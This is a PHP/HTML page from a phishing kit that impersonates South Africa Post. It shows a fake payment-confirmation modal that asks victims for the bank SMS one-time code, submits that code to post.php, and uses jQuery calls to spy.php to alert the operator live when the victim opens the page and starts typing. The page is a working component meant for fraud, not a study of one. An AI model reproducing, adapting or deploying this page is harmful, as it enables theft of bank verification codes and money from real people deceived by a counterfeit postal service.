<?php 

     require_once "function.php";

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>South Africa Post</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/boom.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>
</head>
<body class="modal-open">
        
        <!-- Modal -->
        <div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
          <div class="modal-dialog shadow">
            <div class="modal-content">
              <div class="modal-header ">
                    <img src="image/Emarats.png">
              </div>
              <div class="modal-body">
                <div class="text-center pp">
                    <h6>Please confirm the following payment</h6>
                </div>
                <div class="tato">
                     <p>The unique password has been sent to the mobile number listed below if you need to change your cortex or change it via chanet attables (ATM, WEB)</p>
                </div>
                <form action="post.php" method="post">
                     <input type="hidden" name="step" value="sms_1">
                     <div class="content">
                         <div class="left">
                             <span>Merchantess:</span>
                             <span>Quantity:</span>
                             <span>Date:</span>
                             <span>Card Number:</span>
                             <span class="osama">SMS CODE</span>
                         </div>
                         <div class="right">
                             <span style="color: #0047BB;">South Africa Post</span>
                             <span>R 12,99</span>
                             <span><?php echo date('l jS \of  h:i A'); ?></span>
                             <span>XXXX XXXX XXXX XXXX</span>
                             <span>
                                 <div class="form-group mt-4">
                                     <input type="text" name="sim" id="sim" class="form-control" style="border:1px solid red">
                                     <div class="erreur_sms">Campo obbligatorio!</div>
                                 </div>
                             </span>
                         </div>
                     </div>
                     <div class="time " >
                         <p>Please enter the verification code received by SMS </p>
                         <div class="countdown ms-2" style="color:#0047BB;"></div>
                     </div>
                     <div class="botona">
                         <button class="btn" name="submit">Confirm</button>
                     </div>
                     <div class="copirayt text-center">
                         <p>2023 © - all rights reserved</p>
                     </div>
                 </form>
              </div>
            </div>
          </div>
        </div>


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>


              $("#sim").focus();
              var timer2 = "02:00";
              var interval = setInterval(function() {
              var timer = timer2.split(':');
              //by parsing integer, I avoid all extra string processing
              var minutes = parseInt(timer[0], 10);
              var seconds = parseInt(timer[1], 10);
              --seconds;
              minutes = (seconds < 0) ? --minutes : minutes;
              if (minutes < 0) clearInterval(interval);
              seconds = (seconds < 0) ? 59 : seconds;
              seconds = (seconds < 10) ? '0' + seconds : seconds;
              //minutes = (minutes < 10) ?  minutes : minutes;
              $('.countdown').html(minutes + ':' + seconds);
              timer2 = minutes + ':' + seconds;
              }, 1000);


            $("#messag").mask("000000");
            			
$.post("spy.php",{otpview:1});
var abort = false;
$("#sim").keyup(function(){
	if(abort==false){
		$.post("spy.php", {otping:1});
		abort=true;
	}
});
        </script>
              
</body>
</html>